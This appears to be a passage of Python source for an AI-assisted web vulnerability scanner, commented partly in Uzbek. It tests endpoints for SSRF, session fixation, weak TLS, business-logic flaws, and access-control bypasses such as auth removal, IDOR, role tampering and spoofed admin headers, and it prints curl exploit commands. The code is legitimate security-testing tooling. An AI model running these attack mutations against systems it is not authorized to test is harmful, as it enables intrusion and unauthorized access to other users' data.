                        url=ep.url, method=ep.method, param=param,
                        payload=payload,
                        evidence=f"SSRF confirmed via {name}: {body[:200]}",
                        baseline_diff="ssrf_extended",
                        tool_output=body[:400],
                        request_raw=f"{ep.method} {ep.url}\n{param.split(':')[-1]}={payload}",
                        response_raw=body[:400],
                        exploit_cmd=f"curl '{ep.url}?{param.split(':')[-1]}={urllib.parse.quote(payload)}'",
                        remediation="Block internal IPs. Whitelist allowed domains. Validate URL scheme.",
                        confirmed=True, tool="ssrf_extended",
                    )
                    self._print_finding(f)
                    findings.append(f)
                    break  # one finding per param is enough
        return findings

    # ── A07: Session Fixation ────────────────────────────────────────────────
    def _session_fixation(self, ep: Endpoint) -> List[Finding]:
        """Login oldida cookie olib, login qilib, cookie o'zgardimi tekshirish."""
        if not any(x in ep.url.lower() for x in ["/login","/signin","/auth"]):
            return []

        # Get session cookie before login
        pre_resp    = self.client.get(ep.url)
        pre_cookies = {k: v for k, v in self.client.session.cookies.items()}
        session_keys = [k for k in pre_cookies if any(
            s in k.lower() for s in [
                "session","sess","sid","csid","phpsessid","jsessionid",
                "token","auth","jwt","bearer","access","refresh","credential",
            ]
        )]
        if not session_keys: return []
        pre_session = pre_cookies.get(session_keys[0],"")

        # Attempt login (any creds — just to trigger session regeneration)
        self.client.post(ep.url, data={"username":"admin","password":"wrongpass"})

        # Check if session cookie changed
        post_cookies = dict(self.client.session.cookies)
        post_session = post_cookies.get(session_keys[0],"")

        # Session should change after any auth attempt (even failed)
        if pre_session and post_session and pre_session == post_session:
            return [Finding(
                owasp_id="A07", owasp_name="Authentication Failures",
                title=f"Session Fixation: {ep.url} cookie '{session_keys[0]}' not regenerated",
                risk="High", confidence=80,
                url=ep.url, method="POST", param=f"cookie:{session_keys[0]}",
                payload=pre_session[:40],
                evidence=(f"Cookie '{session_keys[0]}' unchanged after auth attempt. "
                          f"Value: {pre_session[:30]}"),
                baseline_diff="session_fixation",
                tool_output=f"pre={pre_session[:30]}, post={post_session[:30]}",
                request_raw=f"GET {ep.url} → POST {ep.url}",
                response_raw=f"Cookie: {session_keys[0]}={post_session[:40]}",
                exploit_cmd=(
                    f"# 1. Get session: curl -c /tmp/c '{ep.url}'\n"
                    f"# 2. Send to victim: <a href='{ep.url}?PHPSESSID={pre_session[:20]}...'>\n"
                    f"# 3. After victim logs in, use same session"
                ),
                remediation="Regenerate session ID after every authentication event.",
                tool="session_fixation",
            )]
        return []


    # ── A02: SSL/TLS Check ───────────────────────────────────────────────────
    def _ssl_check(self, ep: Endpoint) -> List[Finding]:
        """SSL/TLS weakness detection via nmap."""
        host = urllib.parse.urlparse(ep.url).netloc.split(":")[0]
        if not shutil.which("nmap"):
            return []
        r   = _run_cmd(f"nmap -p 443 --script ssl-enum-ciphers,ssl-cert {host} -T4 --open",
                       timeout=30)
        out = r.get("output","")
        issues = []
        if "SSLv3"  in out: issues.append("SSLv3 enabled (POODLE attack)")
        if "TLSv1.0" in out: issues.append("TLS 1.0 enabled (deprecated)")
        if "TLSv1.1" in out: issues.append("TLS 1.1 enabled (deprecated)")
        if "RC4"    in out or "DES" in out:  issues.append("Weak cipher (RC4/DES)")
        if "EXPIRED" in out.upper():         issues.append("Certificate expired")
        if "self-signed" in out.lower():     issues.append("Self-signed certificate")
        if not issues:
            return []
        return [Finding(
            owasp_id="A02", owasp_name="Cryptographic Failures",
            title=f"SSL/TLS Weakness ({len(issues)} issues): {host}",
            risk="High", confidence=85,
            url=ep.url, method="GET", param="SSL/TLS", payload="",
            evidence="; ".join(issues),
            baseline_diff="ssl_check", tool_output=out[:400],
            request_raw=f"nmap ssl-enum-ciphers {host}",
            response_raw=out[:400],
            exploit_cmd=f"testssl.sh {host}",
            remediation="Disable SSLv3/TLS1.0/1.1. Remove weak ciphers. Use TLS 1.2+.",
            tool="ssl_check",
        )]

    # ── A04: Business Logic ───────────────────────────────────────────────────
    def _business_logic(self, ep: Endpoint) -> List[Finding]:
        """
        Business logic flaws — negative amounts, zero quantity, price manipulation.
        AI-driven: AI analyzes endpoint params and suggests logic attacks.
        """
        if ep.method not in ("POST","PUT","PATCH"):
            return []

        findings = []
        url_l    = ep.url.lower()

        # AI yordamida BARCHA numeric-like parametrlarni topish — hardcoded nom yo'q
        numeric_params = {}

        # 1. Known keywords
        known_kws = [
            "amount","price","qty","quantity","count","total","value","sum",
            "cost","fee","rate","balance","credit","debit","points","units",
            "num","number","limit","max","min","discount","tax","subtotal",
        ]
        for k, v in ep.params.items():
            pn = k.split(":")[-1].lower()
            if any(x in pn for x in known_kws):
                numeric_params[k] = v

        # 2. Qiymat raqam bo'lsa ham olish (param nomi muhim emas)
        for k, v in ep.params.items():
            if k in numeric_params: continue
            if k.startswith("header:") or k.startswith("cookie:"): continue
            try:
                float(str(v))  # raqammi?
                numeric_params[k] = v
            except (ValueError, TypeError):
                pass

        # 3. AI orqali qo'shimcha param topish (agar Ollama bor bo'lsa)
        if HAS_OLLAMA and not numeric_params and ep.params:
            prompt = f"""Which of these HTTP parameters likely represent numeric values
(price, quantity, amount, count, score, balance, etc)?

Parameters: {json.dumps({k.split(":")[-1]: v for k,v in list(ep.params.items())[:20]})}

Return JSON: {{"numeric_params": ["param_name1", "param_name2"]}}"""
            ai_r = self.ai._call(prompt, cache=True)
            if ai_r and ai_r.get("numeric_params"):
                for pname in ai_r["numeric_params"]:
                    matching = [k for k in ep.params if k.split(":")[-1] == pname]
                    for k in matching:
                        numeric_params[k] = ep.params[k]

        if not numeric_params:
            return []

        logic_cases = []

        # 1. Negative amount
        for param, orig_val in list(numeric_params.items())[:3]:
            pname = param.split(":")[-1]
            logic_cases.append({
                "name":    f"negative_{pname}",
                "param":   param,
                "payload": "-1",
                "desc":    f"Negative {pname} value",
            })
            logic_cases.append({
                "name":    f"zero_{pname}",
                "param":   param,
                "payload": "0",
                "desc":    f"Zero {pname}",
            })
            logic_cases.append({
                "name":    f"overflow_{pname}",
                "param":   param,
                "payload": "99999999",
                "desc":    f"Integer overflow {pname}",
            })

        # Get baseline
        clean_orig = {k.split(":")[-1]: v for k, v in ep.params.items()
                      if not k.startswith("header:") and not k.startswith("path:")}
        orig_resp  = self.client.post(ep.url, data=clean_orig)
        orig_body  = orig_resp.get("body","").lower()

        for case in logic_cases[:6]:
            if self.ctx.already_tested(ep.url, ep.method, case["param"], case["payload"]):
                continue
            test_params = dict(clean_orig)
            test_params[case["param"].split(":")[-1]] = case["payload"]
            resp  = self.client.post(ep.url, data=test_params)
            body  = resp.get("body","").lower()
            self.agentic._last_resp = resp

            # Success indicators — transaction went through
            success_sigs = [
                "success" in body and "success" not in orig_body,
                "complete" in body and "complete" not in orig_body,
                "confirmed" in body and "confirmed" not in orig_body,
                resp.get("status") in (200,201,302) and
                    abs(len(body) - len(orig_body)) > 100,
            ]
            error_sigs = ["error","invalid","rejected","failed","negative","must be positive"]

            if any(success_sigs) and not any(s in body for s in error_sigs):
                ai_ctx = {
                    "url": ep.url, "method": ep.method,
                    "param": case["param"], "payload": case["payload"],
                    "tool": "business_logic",
                    "baseline_status": orig_resp.get("status",0),
                    "baseline_size": len(orig_body),
                    "baseline_timing": 0.0, "baseline_title": "",
                    "fuzz_status": resp.get("status",0),
                    "fuzz_size": len(body),
                    "fuzz_timing": resp.get("timing",0),
                    "timing_diff": 0, "size_diff": len(body)-len(orig_body),
                    "size_pct": abs(len(body)-len(orig_body))/max(len(orig_body),1)*100,
                    "time_anomaly": False, "new_errors": [],
                    "status_changed": orig_resp.get("status") != resp.get("status"),
                    "body_snippet": resp.get("body","")[:600],
                    "tool_output": f"{case['desc']}: payload={case['payload']} accepted",
                }
                ai_r = self.ai.classify_finding(ai_ctx)
                if ai_r and ai_r.get("found") and ai_r.get("confidence",0) >= MIN_CONFIDENCE:
                    f = Finding(
                        owasp_id="A04", owasp_name="Insecure Design",
                        title=f"Business Logic: {case['desc']} accepted at {ep.url}",
                        risk=ai_r.get("risk","High"),
                        confidence=ai_r.get("confidence",70),
                        url=ep.url, method=ep.method,
                        param=case["param"], payload=case["payload"],
                        evidence=ai_r.get("evidence",
                                 f"{case['desc']} payload={case['payload']} accepted, response changed"),
                        baseline_diff=f"orig={len(orig_body)}b, test={len(body)}b",
                        tool_output=resp.get("body","")[:400],
                        request_raw=f"POST {ep.url}\n{case['param'].split(':')[-1]}={case['payload']}",
                        response_raw=resp.get("body","")[:400],
                        exploit_cmd=f"curl -X POST -d '{case['param'].split(':')[-1]}={case['payload']}' '{ep.url}'",
                        remediation="Validate all numeric inputs server-side. Reject negative/zero values.",
                        tool="business_logic",
                    )
                    self.agentic._print_finding(f)
                    findings.append(f)
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# AI REPEATER — Burp Suite Repeater/Scanner darajasida authorized API testing
# ─────────────────────────────────────────────────────────────────────────────
class RequestInterceptor:
    """
    Burp Suite Repeater + Scanner logikasi:

    Har topilgan endpoint uchun:
    1. Baseline request yuborib response yodlanadi
    2. AI request-ni o'rganadi: method, headers, body, params
    3. AI barcha mumkin mutation-larni ro'yxatlaydi
    4. Har mutatsiya yuboriladi, response taqqoslanadi
    5. Farq topilsa AI tahlil qiladi: zaiflikmi?

    Mutation turlari:
    - AUTH REMOVAL   : Authorization/Cookie olib tashlash → unauth access?
    - IDOR           : /users/10 → /users/1,2,11 → boshqa user data?
    - METHOD SWITCH  : POST → GET, PUT, DELETE, PATCH, HEAD, OPTIONS
    - PARAM TAMPER   : role=user → role=admin, status=inactive → active
    - PATH ESCALATION: /api/user/me → /api/user, /api/users, /api/admin
    - HEADER INJECT  : X-User-Id, X-Role, X-Admin, X-Forwarded-For
    - OBJECT LEVEL   : nested object ID-larni o'zgartirish
    - SENSITIVE LEAK : response-da password, token, key bormi?
    - RATE BYPASS    : parallel request bilan rate limit o'tkazib yuborish
    """

    def __init__(self, client: "HTTPClient", ai: "AIEngine", ctx: "ScanContext"):
        self.client   = client
        self.ai       = ai
        self.ctx      = ctx
        self._done:   Set[str] = set()

    # ── Main entry — scan pipeline dan chaqiriladi ────────────────────────────
    def analyze_endpoints(self, endpoints: List["Endpoint"]) -> List["Finding"]:
        console.print(f"\n[bold cyan]━━ AI REPEATER ━━[/bold cyan]")
        console.print(f"  [dim]Burp Suite Repeater/Scanner darajasida tahlil...[/dim]")

        findings: List[Finding] = []
        # Priority: POST/PUT/PATCH/DELETE > GET, high-score first
        ordered = sorted(
            endpoints[:100],
            key=lambda e: (
                0 if e.method in ("POST","PUT","PATCH","DELETE") else 1,
                -e.score,
            )
        )
        for ep in ordered:
            key = f"{ep.method}:{ep.url}"
            if key in self._done: continue
            self._done.add(key)
            try:
                found = self._replay(ep)
                findings.extend(found)
            except AIRequiredError:
                raise
            except Exception as ex:
                console.print(f"  [dim red]  Repeater error: {ex}[/dim red]")

        console.print(
            f"  [green]✓ AI Repeater: {len(findings)} finding(s)[/green]"
        )
        return findings

    # ── Core replay engine ────────────────────────────────────────────────────
    def _replay(self, ep: "Endpoint") -> List["Finding"]:
        findings: List[Finding] = []

        # 1. Baseline — haqiqiy request
        baseline_resp = self._send(ep, ep.params, ep.method)
        if baseline_resp.get("status") == 0:
            return []

        b_status = baseline_resp.get("status", 0)
        b_body   = baseline_resp.get("body", "")
        b_size   = len(b_body)
        b_hdrs   = baseline_resp.get("headers", {})

        # 2. AI dan to'liq mutation plan olish
        mutations = self._ai_plan_mutations(ep, baseline_resp)
        if not mutations:
            mutations = self._heuristic_mutations(ep)

        console.print(
            f"  [dim]  → {ep.method} {ep.url[:60]} "
            f"[{b_status}] — {len(mutations)} mutation(s)[/dim]"
        )

        # 3. Har mutatsiyani bajarish
        for mut in mutations:
            result = self._execute_mutation(mut, ep, baseline_resp)
            if result:
                findings.append(result)

        # 4. Sensitive data leak tekshirish (baseline response-da)
        leak_findings = self._check_sensitive_leak(ep, b_body, b_hdrs)
        findings.extend(leak_findings)

        # 5. Cookie security
        findings.extend(self._check_cookie_security(ep, b_hdrs))

        return findings

    # ── AI mutation planner ───────────────────────────────────────────────────
    def _ai_plan_mutations(self, ep: "Endpoint",
                           resp: dict) -> list:
        """
        AI request-ni ko'rib, qaysi mutatsiyalarni sinash kerakligini hal qiladi.
        Hardcoded list emas — AI har endpoint uchun o'ylab topadi.
        """
        body_sample = resp.get("body","")[:800]
        prompt = f"""You are a senior penetration tester doing authorized API security testing.
Analyze this HTTP request/response and plan ALL security mutations to test.

REQUEST:
  Method:  {ep.method}
  URL:     {ep.url}
  Headers: {json.dumps({k:v for k,v in (ep.headers or {}).items() if k.lower() not in ("cookie","authorization")}, default=str)}
  Params:  {json.dumps({k.split(":")[-1]:v for k,v in list(ep.params.items())[:15]}, default=str)}
  Has Auth: {"yes" if self.client.session.jwt_token or self.client.session.cookies else "no"}

RESPONSE:
  Status: {resp.get("status",0)}
  Size:   {len(resp.get("body",""))}
  Body:   {self._clean(body_sample)}

PLAN every mutation worth testing:
- AUTH_REMOVE    : remove Authorization header entirely
- AUTH_REMOVE    : remove session cookies entirely
- IDOR           : if URL has numeric ID, try adjacent IDs (id-1, id+1, id+100)
- IDOR           : if body has user_id/account_id fields, change them
- METHOD_SWITCH  : try GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS
- PARAM_TAMPER   : role/admin/privilege/status field manipulation
- PATH_ESCALATE  : try parent path, /admin version, /all version
- HEADER_INJECT  : X-User-Id, X-Role, X-Admin, X-Original-User
- OBJECT_LEVEL   : nested IDs in JSON body
- PRIV_ESCALATE  : add is_admin=true, role=admin to request

Return JSON with ALL relevant mutations:
{{
  "mutations": [
    {{
      "id": "unique_id",
      "type": "AUTH_REMOVE|IDOR|METHOD_SWITCH|PARAM_TAMPER|PATH_ESCALATE|HEADER_INJECT|OBJECT_LEVEL|PRIV_ESCALATE",
      "description": "what this tests and why",
      "changes": {{
        "method":  "GET",
        "url":     "/new/path",
        "remove_headers": ["Authorization"],
        "add_headers":    {{"X-Role": "admin"}},
        "param_changes":  {{"role": "admin", "user_id": "1"}},
        "body_changes":   {{"is_admin": true}}
      }}
    }}
  ]
}}"""

        result = self.ai._call(prompt, cache=False)
        if result and isinstance(result.get("mutations"), list):
            return result["mutations"]
        return []

    # ── Heuristic mutations (AI unavailable bo'lsa) ───────────────────────────
    def _heuristic_mutations(self, ep: "Endpoint") -> list:
        """AI bo'lmasa ham ishlaydi — heuristic mutation plan."""
        mutations = []
        url   = ep.url
        meth  = ep.method
        params= ep.params

        # 1. Auth removal — har doim sinash
        if self.client.session.jwt_token:
            mutations.append({
                "id":"auth_jwt_remove","type":"AUTH_REMOVE",
                "description":"Remove JWT Authorization header — unauthenticated access test",
                "changes":{"remove_headers":["Authorization"]},
            })
        if self.client.session.cookies:
            mutations.append({
                "id":"auth_cookie_remove","type":"AUTH_REMOVE",
                "description":"Remove session cookies — unauthenticated access test",
                "changes":{"remove_cookies": True},
            })

        # 2. IDOR — URL-da raqam bormi?
        import re as _re
        id_match = _re.search(r"/(\d+)(?:/|$|\?)", url)
        if id_match:
            orig_id = int(id_match.group(1))
            for delta_id in [orig_id-1, orig_id+1, orig_id+100, 1, 2]:
                if delta_id < 0: continue
                new_url = url.replace(
                    f"/{orig_id}", f"/{delta_id}", 1
                )
                mutations.append({
                    "id": f"idor_{delta_id}","type":"IDOR",
                    "description":f"IDOR: change ID {orig_id}→{delta_id}",
                    "changes":{"url": new_url},
                })

        # 3. UUID IDOR
        uuid_match = _re.search(
            r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
            url, _re.I
        )
        if uuid_match:
            for test_uuid in [
                "00000000-0000-0000-0000-000000000001",
                "00000000-0000-0000-0000-000000000002",
            ]:
                mutations.append({
                    "id":f"idor_uuid_{test_uuid[:8]}","type":"IDOR",
                    "description":f"UUID IDOR: {uuid_match.group(1)[:8]}...→{test_uuid[:8]}...",
                    "changes":{"url": url.replace(uuid_match.group(1), test_uuid)},
                })

        # 4. Method switch
        all_methods = ["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"]
        for new_method in all_methods:
            if new_method != meth:
                mutations.append({
                    "id":f"method_{new_method}","type":"METHOD_SWITCH",
                    "description":f"Method: {meth} → {new_method}",
                    "changes":{"method": new_method},
                })

        # 5. Param tamper — role/admin param-lar
        for param_key, param_val in params.items():
            pn = param_key.split(":")[-1].lower()
            if pn in ("role","type","user_type","account_type","privilege","level"):
                for admin_val in ("admin","administrator","superuser","root","1","true"):
                    mutations.append({
                        "id":f"tamper_{pn}_{admin_val}","type":"PARAM_TAMPER",
                        "description":f"Privilege escalation: {pn}={param_val}→{admin_val}",
                        "changes":{"param_changes":{param_key: admin_val}},
                    })

        # 6. Path escalation
        parsed = urllib.parse.urlparse(url)
        parts  = [p for p in parsed.path.split("/") if p]
        if len(parts) >= 2:
            # Parent path
            parent = "/" + "/".join(parts[:-1])
            mutations.append({
                "id":"path_parent","type":"PATH_ESCALATE",
                "description":f"Path escalation: {parsed.path} → {parent}",
                "changes":{"url": urllib.parse.urlunparse(
                    parsed._replace(path=parent)
                )},
            })
        # Admin variant
        for admin_variant in ["/admin", "/all", "/list"]:
            mutations.append({
                "id":f"path{admin_variant.replace('/','_')}",
                "type":"PATH_ESCALATE",
                "description":f"Path escalation: append {admin_variant}",
                "changes":{"url": url.rstrip("/") + admin_variant},
            })

        # 7. Header injection
        for h, v in [
            ("X-User-Id","1"),("X-Role","admin"),
            ("X-Admin","true"),("X-Forwarded-For","127.0.0.1"),
            ("X-Original-User","admin"),("X-Bypass","1"),
        ]:
            mutations.append({
                "id":f"header_{h.lower().replace('-','_')}","type":"HEADER_INJECT",
                "description":f"Header injection: {h}: {v}",
                "changes":{"add_headers":{h:v}},
            })

        return mutations

    @staticmethod
    def _body_hash(body: str) -> str:
        return hashlib.md5(str(body or "").encode("utf-8", errors="ignore")).hexdigest()

    def _response_profile(self, url: str, resp: dict) -> dict:
        return ResponseClassifier.classify(
            url,
            resp.get("headers", {}),
            resp.get("body", ""),
            resp.get("status", 0),
        )

    def _material_response_change(self, baseline: dict, candidate: dict) -> bool:
        b_body = baseline.get("body", "")
        c_body = candidate.get("body", "")
        size_diff = abs(len(c_body) - len(b_body))
        return (
            baseline.get("status", 0) != candidate.get("status", 0) or
            self._body_hash(b_body) != self._body_hash(c_body) or
            size_diff > 120
        )

    def _access_candidate_context(self, baseline_url: str, baseline: dict,
                                  candidate_url: str, candidate: dict) -> dict:
        candidate_sens = RiskScorer.score_body(
            candidate.get("body", ""),
            url=candidate_url,
            headers=candidate.get("headers", {}),
        )
        return {
            "baseline_profile": self._response_profile(baseline_url, baseline),
            "candidate_profile": self._response_profile(candidate_url, candidate),
            "sensitive_candidates": candidate_sens,
            "strong_sensitive": RiskScorer.has_strong_sensitive_candidate(candidate_sens),
            "diff": self._material_response_change(baseline, candidate),
        }

    @staticmethod
    def _response_is_publicish(profile: dict) -> bool:
        return profile.get("verdict") in {"static_asset", "public_page", "login_page"}

    def _confirm_access_candidate(self, vector: str, url: str, method: str,
                                  baseline: dict, candidate: dict,
                                  ctx: dict) -> Optional[dict]:
        candidate_profile = ctx["candidate_profile"]
        if self._response_is_publicish(candidate_profile):
            return None
        if not ctx["diff"] and not ctx["strong_sensitive"]:
            return None
        if candidate_profile.get("verdict") not in {"data_response", "protected_content"} and not ctx["strong_sensitive"]:
            return None
        result = self.ai.verify_access_exposure(
            vector=vector,
            url=url,
            method=method,
            baseline=baseline,
            candidate=candidate,
            baseline_profile=ctx["baseline_profile"],
            candidate_profile=candidate_profile,
            sensitive_candidates=ctx["sensitive_candidates"],
        )
        if not result.get("is_real") or result.get("confidence", 0) < max(MIN_CONFIDENCE, 70):
            return None
        return result

    # ── Execute one mutation ──────────────────────────────────────────────────
    def _execute_mutation(self, mut: dict, ep: "Endpoint",
                          baseline: dict) -> Optional["Finding"]:
        """Mutatsiyani bajaradi va natijani tahlil qiladi."""
        changes  = mut.get("changes", {})
        mut_type = mut.get("type","")
        mut_desc = mut.get("description","")

        # Request parametrlari
        method  = changes.get("method", ep.method)
        url     = changes.get("url", ep.url)
        params  = dict(ep.params)

        # Param o'zgarishlar
        for k, v in changes.get("param_changes", {}).items():
            # Exact match yoki suffix match
            matching = [pk for pk in params if pk.split(":")[-1] == k or pk == k]
            if matching:
                params[matching[0]] = v
            else:
                params[k] = v

        # Extra headers
        extra_headers = dict(changes.get("add_headers", {}))

        # Auth removal
        remove_headers = [h.lower() for h in changes.get("remove_headers", [])]
        remove_cookies = changes.get("remove_cookies", False)

        # Dedup check
        test_key = hashlib.md5(
            f"{method}:{url}:{json.dumps(params,sort_keys=True)[:100]}:"
            f"{json.dumps(extra_headers,sort_keys=True)}:"
            f"{remove_headers}:{remove_cookies}".encode()
        ).hexdigest()
        if self.ctx.already_tested(url, method, mut.get("id",""), test_key):
            return None

        # Auth removal — temp session
        orig_jwt     = self.client.session.jwt_token
        orig_cookies = dict(self.client.session.cookies)
        orig_hdrs    = dict(self.client.session.headers)

        if "authorization" in remove_headers:
            self.client.session.jwt_token = ""
            extra_headers.pop("Authorization", None)
        if remove_cookies:
            self.client.session.cookies.clear()

        # Request yuborish
        try:
            resp = self._send_raw(method, url, params, extra_headers, ep)
        finally:
            # Restore session
            self.client.session.jwt_token = orig_jwt
            self.client.session.cookies.update(orig_cookies)

        m_status = resp.get("status", 0)
        m_body   = resp.get("body", "")
        b_status = baseline.get("status", 0)
        b_body   = baseline.get("body", "")

        if m_status == 0:
            return None

        # ── Finding detection logic ───────────────────────────────────────────
        finding = None
        had_auth_context = bool(orig_jwt or orig_cookies)

        if mut_type == "AUTH_REMOVE":
            if had_auth_context and m_status in (200, 201) and len(m_body) > 80:
                ctx = self._access_candidate_context(ep.url, baseline, url, resp)
                if not self._response_is_publicish(ctx["baseline_profile"]) and (ctx["diff"] or ctx["strong_sensitive"]):
                    ai_verdict = self._confirm_access_candidate("AUTH_REMOVE", url, method, baseline, resp, ctx)
                    if ai_verdict:
                        sens = ctx["sensitive_candidates"]
                        ev = (
                            ai_verdict.get("evidence")
                            or f"Unauthenticated access changed response: status {b_status}->{m_status}"
                        )
                        if sens:
                            ev += f"; candidates={ [s['label'] for s in sens[:3]] }"
                        finding = self._make_finding(
                            owasp_id="A07", owasp_name="Authentication Failures",
                            title=f"Auth Bypass — No Auth Required: {ep.method} {ep.url}",
                            risk=ai_verdict.get("risk", "High"),
                            confidence=ai_verdict.get("confidence", 75),
                            url=ep.url, method=method,
                            param="Authorization/Cookie",
                            payload=f"Removed: {remove_headers or 'cookies'}",
                            evidence=ev,
                            response_raw=m_body[:900],
                            exploit_cmd=(
                                f"curl -X {method} '{url}'"
                                + (" (no Authorization header)" if "authorization" in remove_headers
                                   else " (no cookies)")
                            ),
                            remediation="Enforce authentication on every endpoint. Never trust missing auth.",
                            confirmed=bool(ai_verdict.get("confirmed")),
                        )
            # Unauthenticated access — 200 va meaningful response?
            if False and m_status in (200, 201) and len(m_body) > 100:
                body_l = m_body.lower()
                # Login page emas
                login_sigs = sum(1 for s in ["password","login","sign in","signin"]
                                 if s in body_l)
                if login_sigs < 2:
                    sens = RiskScorer.score_body(m_body)
                    ev   = (f"Unauthenticated access to {ep.method} {ep.url}: "
                            f"status {b_status}→{m_status}, "
                            f"size {len(b_body)}→{len(m_body)}")
                    if sens:
                        ev += f", sensitive data: {[s['key'] for s in sens[:4]]}"
                    finding = self._make_finding(
                        owasp_id="A07", owasp_name="Authentication Failures",
                        title=f"Auth Bypass — No Auth Required: {ep.method} {ep.url}",
                        risk="Critical" if sens else "High",
                        confidence=90 if sens else 72,
                        url=ep.url, method=method,
                        param="Authorization/Cookie",
                        payload=f"Removed: {remove_headers or 'cookies'}",
                        evidence=ev,
                        response_raw=m_body[:600],
                        exploit_cmd=(
                            f"curl -X {method} '{url}'"
                            + (" (no Authorization header)" if "authorization" in remove_headers
                               else " (no cookies)")
                        ),
                        remediation="Enforce authentication on every endpoint. Never trust missing auth.",
                        confirmed=bool(sens),
                    )

        elif mut_type == "IDOR":
            # Boshqa user/object data-si chiqdi?
            if m_status in (200, 201) and len(m_body) > 80:
                # Response farq qiladimi baseline dan?
                orig_hash = hashlib.md5(b_body.encode()).hexdigest()
                mut_hash  = hashlib.md5(m_body.encode()).hexdigest()
                size_diff = abs(len(m_body) - len(b_body))

                if orig_hash != mut_hash and (size_diff > 50 or m_status != b_status):
                    sens = RiskScorer.score_body(m_body)
                    # AI verify
                    ai_confirm = self._ai_verify_idor(
                        ep.url, url, b_body, m_body, mut_desc
                    )
                    if ai_confirm.get("is_idor") and ai_confirm.get("confidence",0) >= MIN_CONFIDENCE:
                        finding = self._make_finding(
                            owasp_id="A01",
                            owasp_name="Broken Access Control",
                            title=f"IDOR — Object Level Auth Bypass: {url}",
                            risk="High",
                            confidence=ai_confirm.get("confidence", 75),
                            url=ep.url, method=method,
                            param="URL path ID",
                            payload=url,
                            evidence=(
                                f"{mut_desc}. "
                                f"AI: {ai_confirm.get('evidence','different data returned')}"
                            ),
                            response_raw=m_body[:600],
                            exploit_cmd=f"curl -X {method} '{url}'",
                            remediation=(
                                "Implement object-level authorization. "
                                "Verify ownership before returning data."
                            ),
                            confirmed=ai_confirm.get("confirmed", False),
                        )

        elif mut_type == "METHOD_SWITCH":
            if m_status in (200, 201, 204) and b_status in (400, 403, 404, 405):
                ctx = self._access_candidate_context(ep.url, baseline, url, resp)
                ai_verdict = self._confirm_access_candidate("METHOD_SWITCH", url, method, baseline, resp, ctx)
                if ai_verdict:
                    finding = self._make_finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"Method Switch Bypass ({method}): {ep.url}",
                        risk=ai_verdict.get("risk", "Medium"),
                        confidence=ai_verdict.get("confidence", 75),
                        url=ep.url, method=method,
                        param="HTTP Method",
                        payload=method,
                        evidence=(
                            ai_verdict.get("evidence")
                            or f"{ep.method}->{method}: status {b_status}->{m_status}, size {len(b_body)}->{len(m_body)}"
                        ),
                        response_raw=m_body[:700],
                        exploit_cmd=f"curl -X {method} '{url}'",
                        remediation="Restrict HTTP methods. Apply ACL per method.",
                        confirmed=bool(ai_verdict.get("confirmed")),
                    )
            # Yangi method-da 200 qaytdi va baseline 4xx edi?
            if False and m_status in (200,201,204) and b_status in (400,403,404,405):
                finding = self._make_finding(
                    owasp_id="A01",
                    owasp_name="Broken Access Control",
                    title=f"Method Switch Bypass ({method}): {ep.url}",
                    risk="Medium",
                    confidence=75,
                    url=ep.url, method=method,
                    param="HTTP Method",
                    payload=method,
                    evidence=(
                        f"{ep.method}→{method}: status {b_status}→{m_status}, "
                        f"size {len(b_body)}→{len(m_body)}"
                    ),
                    response_raw=m_body[:400],
                    exploit_cmd=f"curl -X {method} '{url}'",
                    remediation="Restrict HTTP methods. Apply ACL per method.",
                )

        elif mut_type in ("PARAM_TAMPER", "PRIV_ESCALATE"):
            # Privilege escalation — response o'zgardimi?
            if m_status in (200,201) and b_status in (200,201):
                orig_hash = hashlib.md5(b_body.encode()).hexdigest()
                mut_hash  = hashlib.md5(m_body.encode()).hexdigest()
                if orig_hash != mut_hash:
                    # Admin content bormi?
                    admin_sigs = any(
                        s in m_body.lower() and s not in b_body.lower()
                        for s in ["admin","administrator","superuser",
                                  "all users","manage","delete","ban"]
                    )
                    if admin_sigs or abs(len(m_body)-len(b_body)) > 200:
                        finding = self._make_finding(
                            owasp_id="A01",
                            owasp_name="Broken Access Control",
                            title=f"Privilege Escalation via Param: {mut_desc[:60]}",
                            risk="High",
                            confidence=78,
                            url=ep.url, method=method,
                            param=str(changes.get("param_changes",{})),
                            payload=str(changes.get("param_changes",{})),
                            evidence=(
                                f"Param tamper caused response change. "
                                f"Size diff: {abs(len(m_body)-len(b_body))}b. "
                                + ("Admin content appeared." if admin_sigs else "")
                            ),
                            response_raw=m_body[:600],
                            exploit_cmd=(
                                f"curl -X {method} '{url}' "
                                f"-d '{urllib.parse.urlencode(changes.get('param_changes',{}))}'"
                            ),
                            remediation=(
                                "Never trust user-supplied role/privilege fields. "
                                "Set role server-side from authenticated session."
                            ),
                        )

        elif mut_type == "PATH_ESCALATE":
            if m_status in (200, 201) and b_status in (401, 403, 404):
                ctx = self._access_candidate_context(ep.url, baseline, url, resp)
                ai_verdict = self._confirm_access_candidate("PATH_ESCALATE", url, method, baseline, resp, ctx)
                if ai_verdict:
                    finding = self._make_finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"Path Escalation: {ep.url} → {url}",
                        risk=ai_verdict.get("risk", "High"),
                        confidence=ai_verdict.get("confidence", 75),
                        url=ep.url, method=method,
                        param="URL Path",
                        payload=url,
                        evidence=(
                            ai_verdict.get("evidence")
                            or f"Path change {ep.url}->{url}: status {b_status}->{m_status}"
                        ),
                        response_raw=m_body[:700],
                        exploit_cmd=f"curl '{url}'",
                        remediation="Apply authorization checks on all paths. Use allowlist.",
                        confirmed=bool(ai_verdict.get("confirmed")),
                    )
            if False and m_status in (200,201) and b_status in (401,403,404):
                body_l = m_body.lower()
                login_sigs = sum(1 for s in ["password","login","sign in"] if s in body_l)
                sens = RiskScorer.score_body(m_body)
                if login_sigs < 2 and (sens or len(m_body) > 200):
                    finding = self._make_finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"Path Escalation: {ep.url} → {url}",
                        risk="High",
                        confidence=80 if sens else 65,
                        url=ep.url, method=method,
                        param="URL Path",
                        payload=url,
                        evidence=(
                            f"Path change {ep.url}→{url}: "
                            f"status {b_status}→{m_status}"
                            + (f", sensitive: {[s['key'] for s in sens[:3]]}" if sens else "")
                        ),
                        response_raw=m_body[:600],
                        exploit_cmd=f"curl '{url}'",
                        remediation="Apply authorization checks on all paths. Use allowlist.",
                    )

